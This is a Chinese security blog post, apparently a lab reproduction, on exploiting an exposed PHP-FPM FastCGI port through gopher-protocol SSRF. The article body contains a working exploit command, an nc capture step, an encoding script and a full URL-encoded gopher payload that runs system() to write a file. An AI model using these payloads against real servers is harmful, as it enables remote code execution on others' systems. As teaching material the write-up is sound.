@@ -1,0 +1,624 @@
+<!DOCTYPE html>
+<html lang="zh-Hans">
+<head>
+
+    <!--[if lt IE 9]>
+        <style>body {display: none; background: none !important} </style>
+        <meta http-equiv="Refresh" Content="0; url=//outdatedbrowser.com/" />
+    <![endif]-->
+
+<meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+<meta name="format-detection" content="telephone=no" />
+<meta name="author" content="0verWatch" />
+
+
+
+<meta name="description" content="这一篇文章是上一篇文章的一些扩展内容，虽然这个环境极其苛刻，但是学到一些新的知识就好。 这篇文章大多数内容是来自p神博文的，我只是做个总结顺便做个复现，Orz。">
+<meta name="keywords" content="Web,FastCGI">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Gopher攻击FastCGI的小结">
+<meta property="og:url" content="0verwatch.top/Gopher-fastcgi.html">
+<meta property="og:site_name" content="0verWatch&#39;s Blog">
+<meta property="og:description" content="这一篇文章是上一篇文章的一些扩展内容，虽然这个环境极其苛刻，但是学到一些新的知识就好。 这篇文章大多数内容是来自p神博文的，我只是做个总结顺便做个复现，Orz。">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://s2.ax1x.com/2019/06/23/ZPwJoR.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/06/23/ZP6Qhj.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/06/23/ZPWG0P.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/06/23/ZPfk9g.png">
+<meta property="og:updated_time" content="2019-06-23T09:33:03.253Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Gopher攻击FastCGI的小结">
+<meta name="twitter:description" content="这一篇文章是上一篇文章的一些扩展内容，虽然这个环境极其苛刻，但是学到一些新的知识就好。 这篇文章大多数内容是来自p神博文的，我只是做个总结顺便做个复现，Orz。">
+<meta name="twitter:image" content="https://s2.ax1x.com/2019/06/23/ZPwJoR.png">
+
+<link rel="apple-touch-icon" href= "/apple-touch-icon.png">
+
+
+    <link rel="alternate" href="/atom.xml" title="0verWatch&#39;s Blog" type="application/atom+xml">
+
+
+
+    <link rel="shortcut icon" href="/img/crystal.png">
+
+
+
+    <link href="//cdn.bootcss.com/animate.css/3.5.1/animate.min.css" rel="stylesheet">
+
+
+
+    <link href="//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.css" rel="stylesheet">
+
+
+
+    <script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
+    <link href="//cdn.bootcss.com/pace/1.0.2/themes/blue/pace-theme-minimal.css" rel="stylesheet">
+
+
+<link rel="stylesheet" href="/css/style.css">
+
+
+
+<link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
+
+
+<title>Gopher攻击FastCGI的小结 | 0verWatch&#39;s Blog</title>
+
+<script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
+<script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
+
+<script>
+    var yiliaConfig = {
+        fancybox: true,
+        animate: true,
+        isHome: false,
+        isPost: true,
+        isArchive: false,
+        isTag: false,
+        isCategory: false,
+        fancybox_js: "//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.js",
+        scrollreveal: "//cdn.bootcss.com/scrollReveal.js/3.1.4/scrollreveal.min.js",
+        search: true
+    }
+</script>
+
+
+    <script>
+        yiliaConfig.jquery_ui = [true, "//cdn.bootcss.com/jqueryui/1.10.4/jquery-ui.min.js", "//cdn.bootcss.com/jqueryui/1.10.4/css/jquery-ui.min.css"];
+    </script>
+
+
+
+    <script> yiliaConfig.rootUrl = "\/";</script>
+
+
+
+    <script src="//s7.addthis.com/js/300/addthis_widget.js#pubid=ra-56ff76c972fc0cf9"></script>
+
+
+
+    <script>
+        var _hmt = _hmt || [];
+        (function() {
+            var hm = document.createElement("script");
+            hm.src = "//hm.baidu.com/hm.js?e9bf2f4b24d981680e6d59ced18982b0";
+            var s = document.getElementsByTagName("script")[0]; 
+            s.parentNode.insertBefore(hm, s);
+        })();
+    </script>
+
+
+</head>
+<body>
+  <div id="container">
+    <div class="left-col">
+    <div class="overlay"></div>
+<div class="intrude-less">
+    <header id="header" class="inner">
+        <a href="/" class="profilepic">
+            <img src="/img/avatar.jpg" class="animated zoomIn">
+        </a>
+        <hgroup>
+          <h1 class="header-author"><a href="/">0verWatch</a></h1>
+        </hgroup>
+
+        
+        <p class="header-subtitle">学习本无底，前进莫彷徨</p>
+        
+
+        
+            <form id="search-form">
+            <input type="text" id="local-search-input" name="q" placeholder="search..." class="search form-control" autocomplete="off" autocorrect="off" searchonload="false" />
+            <i class="fa fa-times" onclick="resetSearch()"></i>
+            </form>
+            <div id="local-search-result"></div>
+            <p class='no-result'>No results found <i class='fa fa-spinner fa-pulse'></i></p>
+        
+
+
+        
+            <div id="switch-btn" class="switch-btn">
+                <div class="icon">
+                    <div class="icon-ctn">
+                        <div class="icon-wrap icon-house" data-idx="0">
+                            <div class="birdhouse"></div>
+                            <div class="birdhouse_holes"></div>
+                        </div>
+                        <div class="icon-wrap icon-ribbon hide" data-idx="1">
+                            <div class="ribbon"></div>
+                        </div>
+                        
+                        <div class="icon-wrap icon-link hide" data-idx="2">
+                            <div class="loopback_l"></div>
+                            <div class="loopback_r"></div>
+                        </div>
+                        
+                        
+                    </div>
+                    
+                </div>
+                <div class="tips-box hide">
+                    <div class="tips-arrow"></div>
+                    <ul class="tips-inner">
+                        <li>菜单</li>
+                        <li>标签</li>
+                        
+                        <li>友情链接</li>
+                        
+                        
+                    </ul>
+                </div>
+            </div>
+        
+
+        <div id="switch-area" class="switch-area">
+            <div class="switch-wrap">
+                <section class="switch-part switch-part1">
+                    <nav class="header-menu">
+                        <ul>
+                        
+                            <li><a href="/">主页</a></li>
+                        
+                            <li><a href="/archives/">归档</a></li>
+                        
+                            <li><a href="/tags/">分类&amp;标签</a></li>
+                        
+                            <li><a href="/friends/">友链</a></li>
+                        
+                            <li><a href="/about/">关于我</a></li>
+                        
+                        </ul>
+                    </nav>
+                    <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <a class="fa Coding" href="https://coding.net/u/Ov3rWatch" title="Coding"></a>
+                            
+                                <a class="fa SegmentFault" href="https://segmentfault.com/" title="SegmentFault"></a>
+                            
+                                <a class="fa CSDN" href="https://blog.csdn.net/u011377996" title="CSDN"></a>
+                            
+                                <a class="fa RSS" href="/atom.xml" title="RSS"></a>
+                            
+                        </ul>
+                    </nav>
+                </section>
+                
+                
+                <section class="switch-part switch-part2">
+                    <div class="widget tagcloud" id="js-tagcloud">
+                        <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/C/">C#</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/CRC32爆破/">CRC32爆破</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF/">CTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Crypto/">Crypto</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Docker/">Docker</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/FastCGI/">FastCGI</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Git/">Git</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Hexo/">Hexo</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Linux/">Linux</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Linux安全/">Linux安全</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Linux常用命令/">Linux常用命令</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Misc/">Misc</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Mysql安全配置/">Mysql安全配置</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/PHP/">PHP</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/RSA/">RSA</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/SQL注入/">SQL注入</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/SSTI注入/">SSTI注入</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Social/">Social</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Web/">Web</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Yii/">Yii</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/algorithm/">algorithm</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/misc/">misc</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/php/">php</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/python/">python</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/redis/">redis</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/sql/">sql</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/xss/">xss</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/二分查找/">二分查找</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/代码审计/">代码审计</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/反序列化/">反序列化</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/密码学/">密码学</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/微机实验/">微机实验</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/数据结构/">数据结构</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/文件上传/">文件上传</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/服务器运维/">服务器运维</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/汇编/">汇编</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/沙盒绕过/">沙盒绕过</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/流量分析/">流量分析</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/环境部署/">环境部署</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/编程语言/">编程语言</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/网站渗透/">网站渗透</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/计算机网路/">计算机网路</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/随笔/">随笔</a></li></ul>
+                    </div>
+                </section>
+                
+                
+                
+                <section class="switch-part switch-part3">
+                    <div id="js-friends">
+                    
+                      <a class="main-nav-link switch-friends-link" href="https://pages.github.com/">GitHub</a>
+                    
+                      <a class="main-nav-link switch-friends-link" href="http://202.119.201.199/">CumtCTF</a>
+                    
+                      <a class="main-nav-link switch-friends-link" href="http://ctf.nuptzj.cn">NuptCTF</a>
+                    
+                      <a class="main-nav-link switch-friends-link" href="https://www.jarvisoj.com">Jarvis OJ</a>
+                    
+                      <a class="main-nav-link switch-friends-link" href="http://ctf.codemonster.cn/home">MOCTF</a>
+                    
+                      <a class="main-nav-link switch-friends-link" href="http://ctf.bugku.com/">BugkuCTF</a>
+                    
+                      <a class="main-nav-link switch-friends-link" href="http://www.shiyanbar.com/ctf/practice">实验吧</a>
+                    
+                      <a class="main-nav-link switch-friends-link" href="https://xz.aliyun.com/">先知社区</a>
+                    
+                      <a class="main-nav-link switch-friends-link" href="http://shentoushi.top/">渗透师导航</a>
+                    
+                      <a class="main-nav-link switch-friends-link" href="https://skysec.top/">一叶飘零</a>
+                    
+                      <a class="main-nav-link switch-friends-link" href="http://www.yytpublic.cn">LaurenceYu</a>
+                    
+                      <a class="main-nav-link switch-friends-link" href="http://chun.ringfall.me">ringfall</a>
+                    
+                    </div>
+                </section>
+                
+
+                
+            </div>
+        </div>
+    </header>                
+</div>
+    </div>
+    <div class="mid-col">
+      <nav id="mobile-nav">
+      <div class="overlay">
+          <div class="slider-trigger"></div>
+          <h1 class="header-author js-mobile-header hide"><a href="/" title="回到主页">0verWatch</a></h1>
+      </div>
+    <div class="intrude-less">
+        <header id="header" class="inner">
+            <a href="/" class="profilepic">
+                <img src="/img/avatar.jpg" class="animated zoomIn">
+            </a>
+            <hgroup>
+              <h1 class="header-author"><a href="/" title="回到主页">0verWatch</a></h1>
+            </hgroup>
+            
+            <p class="header-subtitle">学习本无底，前进莫彷徨</p>
+            
+            <nav class="header-menu">
+                <ul>
+                
+                    <li><a href="/">主页</a></li>
+                
+                    <li><a href="/archives/">归档</a></li>
+                
+                    <li><a href="/tags/">分类&amp;标签</a></li>
+                
+                    <li><a href="/friends/">友链</a></li>
+                
+                    <li><a href="/about/">关于我</a></li>
+                
+                <div class="clearfix"></div>
+                </ul>
+            </nav>
+            <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <a class="fa Coding" target="_blank" href="https://coding.net/u/Ov3rWatch" title="Coding"></a>
+                            
+                                <a class="fa SegmentFault" target="_blank" href="https://segmentfault.com/" title="SegmentFault"></a>
+                            
+                                <a class="fa CSDN" target="_blank" href="https://blog.csdn.net/u011377996" title="CSDN"></a>
+                            
+                                <a class="fa RSS" target="_blank" href="/atom.xml" title="RSS"></a>
+                            
+                        </ul>
+            </nav>
+        </header>                
+    </div>
+    <link class="menu-list" tags="标签" friends="友情链接" about="关于我"/>
+</nav>
+      <div class="body-wrap"><article id="post-Gopher-fastcgi" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/Gopher-fastcgi.html" class="article-date">
+      <time datetime="2019-06-23T09:28:46.000Z" itemprop="datePublished">2019-06-23</time>
+</a>
+
+
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      Gopher攻击FastCGI的小结
+    </h1>
+  
+
+      </header>
+      
+      <div class="article-info article-info-post">
+        
+    <div class="article-category tagcloud">
+    <a class="article-category-link" href="/categories/FastCGI/">FastCGI</a>
+    </div>
+
+
+        
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/FastCGI/">FastCGI</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web/">Web</a></li></ul>
+    </div>
+
+        <div class="clearfix"></div>
+      </div>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        
+<p>这一篇文章是上一篇文章的一些扩展内容，虽然这个环境极其苛刻，但是学到一些新的知识就好。</p>
+<p>这篇文章大多数内容是来自p神博文的，我只是做个总结顺便做个复现，Orz。<a id="more"></a><a href="https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html" target="_blank" rel="noopener">传送门</a></p>
+<h3 id="FastCGI"><a href="#FastCGI" class="headerlink" title="FastCGI"></a>FastCGI</h3><p>Fastcgi其实是一个通信协议，和HTTP协议一样，都是进行数据交换的一个通道。fastcgi协议则是服务器中间件和某个语言后端进行数据交换的协议。Fastcgi协议由多个record组成，record也有header和body一说，服务器中间件将这二者按照fastcgi的规则封装好发送给语言后端，语言后端解码以后拿到具体数据，进行指定操作，并将结果再按照该协议封装好后返回给服务器中间件。</p>
+<h3 id="PHP-FPM（FastCGI进程管理器）"><a href="#PHP-FPM（FastCGI进程管理器）" class="headerlink" title="PHP-FPM（FastCGI进程管理器）"></a>PHP-FPM（FastCGI进程管理器）</h3><p>为什么使用nginx进行搭建php环境的时候会出现php-fpm？FPM其实是一个fastcgi协议解析器，Nginx等服务器中间件将用户请求按照fastcgi的规则打包好通过TCP传给谁？其实就是传给FPM。然后再通过FPM去将数据交给对应的PHP文件。</p>
+<p>这篇文章的关键问题就出在这个fpm接收的数据上，只要我们我们构造满足协议规范的请求包去访问该进程监听的端口，就可以导致任意代码的执行，但我们在协议中需要打开设置<code>auto_prepend_file = php://input</code>且<code>allow_url_include = On</code></p>
+<h3 id="利用的条件"><a href="#利用的条件" class="headerlink" title="利用的条件"></a>利用的条件</h3><ul>
+<li>libcurl版本&gt;=7.45.0(由于EXP里有%00，CURL版本小于7.45.0的版本，gopher的%00会被截断)</li>
+<li>PHP-FPM监听端口</li>
+<li>PHP-FPM版本 &gt;= 5.3.3</li>
+<li>知道服务器上任意一个php文件的绝对路径</li>
+</ul>
+<h3 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h3><p>这里我使用的是 vulhunb上的的 fpm 环境，默认是监听的9000端口</p>
+<p><img src="https://s2.ax1x.com/2019/06/23/ZPwJoR.png" alt="ZPwJoR.png"></p>
+<p>但是我们还需要服务器上的一个php文件的绝对路径，现在复现我们可以使用<code>find / -name &quot;*.php&quot;</code>去找，实际情况中的话就得爆破去找了23333</p>
+<p>使用p神的<a href="https://gist.github.com/phith0n/9615e2420f31048f7e30f3937356cf75" target="_blank" rel="noopener">脚本</a>测试一下这个开放的9000端口，是可以成功实现的，所以说直接向外网暴露出这个服务真的很危险。</p>
+<p><img src="https://s2.ax1x.com/2019/06/23/ZP6Qhj.png" alt="ZP6Qhj.png"></p>
+<p>但是既然本篇文章是上一篇文章的扩展，就需要从ssrf的角度去对其进行利用，因此先是本地抓取一波流量，这里使用nc的方式去获取</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python fpm.py 127.0.0.1 -p 2333 -c <span class="string">"&lt;?php system('echo sectest &gt; /tmp/1.php'); exit;?&gt;"</span> /usr/<span class="built_in">local</span>/lib/php/PEAR.php</span><br></pre></td></tr></table></figure>
+<p>nc监听并获取</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 2333 &gt;  1.txt</span><br></pre></td></tr></table></figure>
+<p>然后对其内容进行url编码，获得exp</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">f = open(<span class="string">'1.txt'</span>)</span><br><span class="line"></span><br><span class="line">ff = f.read()</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> quote</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> quote(ff)</span><br></pre></td></tr></table></figure>
+<p><img src="https://s2.ax1x.com/2019/06/23/ZPWG0P.png" alt="ZPWG0P.png"></p>
+<p>构造gopher协议</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopher://127.0.0.1:9000/_%01%01xt%00%08%00%00%00%01%00%00%00%00%00%00%01%04xt%01%E7%00%00%0E%02CONTENT_LENGTH50%0C%10CONTENT_TYPEapplication/text%0B%04REMOTE_PORT9985%0B%09SERVER_NAMElocalhost%11%0BGATEWAY_INTERFACEFastCGI/1.0%0F%0ESERVER_SOFTWAREphp/fcgiclient%0B%09REMOTE_ADDR127.0.0.1%0F%1BSCRIPT_FILENAME/usr/local/lib/php/PEAR.php%0B%1BSCRIPT_NAME/usr/local/lib/php/PEAR.php%09%1FPHP_VALUEauto_prepend_file%20%3D%20php%3A//input%0E%04REQUEST_METHODPOST%0B%02SERVER_PORT80%0F%08SERVER_PROTOCOLHTTP/1.1%0C%00QUERY_STRING%0F%16PHP_ADMIN_VALUEallow_url_include%20%3D%20On%0D%01DOCUMENT_ROOT/%0B%09SERVER_ADDR127.0.0.1%0B%1BREQUEST_URI/usr/local/lib/php/PEAR.php%01%04xt%00%00%00%00%01%05xt%002%00%00%3C%3Fphp%20system%28%27echo%20sectest%20%3E%20/tmp/1.php%27%29%3B%20exit%3B%3F%3E%01%05xt%00%00%00%00</span><br></pre></td></tr></table></figure>
+<p>这里使用curl去模拟，观察tmp目录下确实写入文件</p>
+<p><img src="https://s2.ax1x.com/2019/06/23/ZPfk9g.png" alt="ZPfk9g.png"></p>
+<p>只要在ssrf下探测到有fpm接口的话，我们就可以利用获得代码执行的权限啦。</p>
+<h3 id="Referer"><a href="#Referer" class="headerlink" title="Referer"></a>Referer</h3><p><a href="https://www.virtua1.cn/index.php/web-security/%E6%B5%85%E8%B0%88ssrf%E6%BC%8F%E6%B4%9E-gopher%E6%94%BB%E5%87%BB%E5%86%85%E7%BD%91%E5%BA%94%E7%94%A8%E7%AF%87.html" target="_blank" rel="noopener">https://www.virtua1.cn/index.php/web-security/%E6%B5%85%E8%B0%88ssrf%E6%BC%8F%E6%B4%9E-gopher%E6%94%BB%E5%87%BB%E5%86%85%E7%BD%91%E5%BA%94%E7%94%A8%E7%AF%87.html</a></p>
+
+      
+    </div>
+    
+  </div>
+  
+    
+    <div class="copyright">
+        <p><span>本文标题:</span><a href="/Gopher-fastcgi.html">Gopher攻击FastCGI的小结</a></p>
+        <p><span>文章作者:</span><a href="/" title="回到主页">0verWatch</a></p>
+        <p><span>发布时间:</span>2019-06-23, 17:28:46</p>
+        <p><span>最后更新:</span>2019-06-23, 17:33:03</p>
+        <p>
+            <span>原始链接:</span><a class="post-url" href="/Gopher-fastcgi.html" title="Gopher攻击FastCGI的小结">0verwatch.top/Gopher-fastcgi.html</a>
+            <span class="copy-path" data-clipboard-text="原文: 0verwatch.top/Gopher-fastcgi.html　　作者: 0verWatch" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <script> var clipboard = new Clipboard('.copy-path'); </script>
+        </p>
+        <p>
+            <span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
+        </p>
+    </div>
+
+
+
+    <nav id="article-nav">
+        
+        
+            <div id="article-nav-older" class="article-nav-title">
+                <a href="/redis-vul.html">
+                    redis未授权访问漏洞一些利用
+                </a>
+            </div>
+        
+    </nav>
+
+  
+  
+   
+    <div style="padding: 0; margin: 20px auto; width: 90%; text-align: center;">
+      <br>
+      <div>听说，打赏我的人最后都成了大佬。</div>
+      <br>
+      <button id="rewardButton" disable="enable" onclick="var qr = document.getElementById('QR'); if (qr.style.display === 'none') {qr.style.display='block';} else {qr.style.display='none'}">
+        <div class="btn btn-pay">打赏支持</div>
+      </button>
+      <br>
+      <br>
+      <div id="QR" style="display: none;">
+        
+          <div id="wechat" style="display: inline-block;">
+            <img id="wechat_qr" src="/img/wechatpay.jpg" alt="0verWatch WeChat Pay"/>
+            <p>微信打赏</p>
+          </div>
+        
+        
+          <div id="alipay" style="display: inline-block">
+            <img id="alipay_qr" src="/img/alipay.jpg" alt="0verWatch Alipay"/>
+            <p>支付宝打赏</p>
+          </div>
+        
+        <br>
+        <br>
+      </div>
+    </div>
+
+  
+</article>
+
+    <div id="toc" class="toc-article">
+        <strong class="toc-title">文章目录</strong>
+        
+            <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#FastCGI"><span class="toc-number">1.</span> <span class="toc-text">FastCGI</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PHP-FPM（FastCGI进程管理器）"><span class="toc-number">2.</span> <span class="toc-text">PHP-FPM（FastCGI进程管理器）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#利用的条件"><span class="toc-number">3.</span> <span class="toc-text">利用的条件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#复现"><span class="toc-number">4.</span> <span class="toc-text">复现</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Referer"><span class="toc-number">5.</span> <span class="toc-text">Referer</span></a></li></ol>
+        
+    </div>
+    <style>
+        .left-col .switch-btn,
+        .left-col .switch-area {
+            display: none;
+        }
+        .toc-level-3 i,
+        .toc-level-3 ol {
+            display: none !important;
+        }
+    </style>
+
+    <input type="button" id="tocButton" value="隐藏目录"  title="点击按钮隐藏或者显示文章目录">
+
+    <script>
+        yiliaConfig.toc = ["隐藏目录", "显示目录", !!"false"];
+    </script>
+
+
+
+    
+<div class="share">
+    
+
+    
+        <div class="addthis_sharing_toolbox"></div>
+    
+</div>
+
+
+
+
+
+
+
+              
+        <section class="livere" id="comments">
+    <!-- 来必力City版安装代码 -->
+    <div id="lv-container" data-id="city" data-uid="MTAyMC80MDk1Ny8xNzQ4Mg==">
+    <script type="text/javascript">
+   (function(d, s) {
+       var j, e = d.getElementsByTagName(s)[0];
+       if (typeof LivereTower === 'function') { return; }
+       j = d.createElement(s);
+       j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+       j.async = true;
+       e.parentNode.insertBefore(j, e);
+       })(document, 'script');
+    </script>
+    <noscript> 为正常使用来必力评论功能请激活JavaScript</noscript>
+    </div>
+    <!-- City版安装代码已完成 -->
+</section>。 
+    
+
+
+
+
+    <div class="scroll" id="post-nav-button">
+        
+            <a href="/" title="回到主页"><i class="fa fa-home"></i></a>
+        
+
+        <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
+
+        
+            <a href="/redis-vul.html" title="下一篇: redis未授权访问漏洞一些利用">
+                <i class="fa fa-angle-right"></i>
+            </a>
+        
+    </div>
+
+    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/Gopher-fastcgi.html">Gopher攻击FastCGI的小结</a></li><li class="post-list-item"><a class="post-list-link" href="/redis-vul.html">redis未授权访问漏洞一些利用</a></li><li class="post-list-item"><a class="post-list-link" href="/python-thinking-1.html">关于python传参引发的一些思考</a></li><li class="post-list-item"><a class="post-list-link" href="/week-practice-anheng.html">周周练西湖论剑特别版(部分wp)</a></li><li class="post-list-item"><a class="post-list-link" href="/xss-game.html">xss游戏通关笔记</a></li><li class="post-list-item"><a class="post-list-link" href="/Code-Breaking-Puzzles-Learning.html">Code-Breaking-Puzzles学习</a></li><li class="post-list-item"><a class="post-list-link" href="/thinkphp-5-rce.html">ThinkPHP 5.x RCE分析</a></li><li class="post-list-item"><a class="post-list-link" href="/SSTI-injection.html">SSTI-injection</a></li><li class="post-list-item"><a class="post-list-link" href="/python-sandbox-bypass.html">Python沙盒绕过</a></li><li class="post-list-item"><a class="post-list-link" href="/anheng-1mongth.html">安恒一月赛做题记录</a></li><li class="post-list-item"><a class="post-list-link" href="/upload-labs-wp.html">upload-labs记录</a></li><li class="post-list-item"><a class="post-list-link" href="/Dockerfile-writing.html">Dockerfile编写</a></li><li class="post-list-item"><a class="post-list-link" href="/RSA-python.html">RSA原理及Python实现</a></li><li class="post-list-item"><a class="post-list-link" href="/MD5-python.html">MD5原理及Python实现</a></li><li class="post-list-item"><a class="post-list-link" href="/DES-python.html">DES原理及Python实现</a></li><li class="post-list-item"><a class="post-list-link" href="/writing-2.html">2018嘅總結</a></li><li class="post-list-item"><a class="post-list-link" href="/RC4-python.html">RC4的原理及python实现</a></li><li class="post-list-item"><a class="post-list-link" href="/A5-python.html">A5的原理及python实现</a></li><li class="post-list-item"><a class="post-list-link" href="/swpuctf-2018.html">swpuctf赛后复现</a></li><li class="post-list-item"><a class="post-list-link" href="/anheng-12month.html">安恒12月赛Web题解</a></li><li class="post-list-item"><a class="post-list-link" href="/Virginia-python.html">维吉尼亚密码原理及Python实现</a></li><li class="post-list-item"><a class="post-list-link" href="/CUMT-month-race.html">CUMT第一轮双月赛Web题解</a></li><li class="post-list-item"><a class="post-list-link" href="/anheng-11month.html">安恒11月赛Web题目复现</a></li><li class="post-list-item"><a class="post-list-link" href="/anheng-10month.html">安恒10月赛Web题目复现</a></li><li class="post-list-item"><a class="post-list-link" href="/algorithm-review.html">算法上机考试复习</a></li><li class="post-list-item"><a class="post-list-link" href="/huwang-game.html">护网杯部分题目题解</a></li><li class="post-list-item"><a class="post-list-link" href="/CUMT-CTF-Platform.html">CUMT平台的部分题解</a></li><li class="post-list-item"><a class="post-list-link" href="/anheng-9month.html">安恒9月部分赛题复现</a></li><li class="post-list-item"><a class="post-list-link" href="/hitcon2017-babyfirstv2.html">Hitcon2017 babyfirst-revenge v2复现</a></li><li class="post-list-item"><a class="post-list-link" href="/hitcon2015-babyfirst.html">Hitcon2015 babyfirst复现</a></li><li class="post-list-item"><a class="post-list-link" href="/hitcon2017-babyfirst.html">Hitcon2017 babyfirst-revenge复现</a></li><li class="post-list-item"><a class="post-list-link" href="/liuliangfenxi-5-5.html">铁三2018.5.5数据分析</a></li><li class="post-list-item"><a class="post-list-link" href="/anheng-8month-part1.html">安恒8月应急响应题目回顾</a></li><li class="post-list-item"><a class="post-list-link" href="/sqli-labs-training-4.html">sqli-labs实战记录(四)</a></li><li class="post-list-item"><a class="post-list-link" href="/sqli-labs-training-3.html">sqli-labs实战记录(三)</a></li><li class="post-list-item"><a class="post-list-link" href="/sqli-labs-training-2.html">sqli-labs实战记录(二)</a></li><li class="post-list-item"><a class="post-list-link" href="/sqli-labs-training-1.html">sqli-labs实战记录(一)</a></li><li class="post-list-item"><a class="post-list-link" href="/bin-search-sql.html">二分查找在sql盲注里面的应用</a></li><li class="post-list-item"><a class="post-list-link" href="/Solve-Me-wp.html">Solve Me解题记录</a></li><li class="post-list-item"><a class="post-list-link" href="/sql-inject-protect.html">浅谈SQL注入防御手段</a></li><li class="post-list-item"><a class="post-list-link" href="/sqlmap-usage.html">Sqlmap 使用方法小结</a></li><li class="post-list-item"><a class="post-list-link" href="/Linux-FW.html">Linux防火墙学习</a></li><li class="post-list-item"><a class="post-list-link" href="/Mysql-security-1.html">Mysql安全配置</a></li><li class="post-list-item"><a class="post-list-link" href="/pentest-1.html">记录一次模拟渗透</a></li><li class="post-list-item"><a class="post-list-link" href="/comp-net-2.html">计网实验笔记(二)</a></li><li class="post-list-item"><a class="post-list-link" href="/comp-net-1.html">计网实验笔记(一)</a></li><li class="post-list-item"><a class="post-list-link" href="/weiji-exam.html">微机实验考试</a></li><li class="post-list-item"><a class="post-list-link" 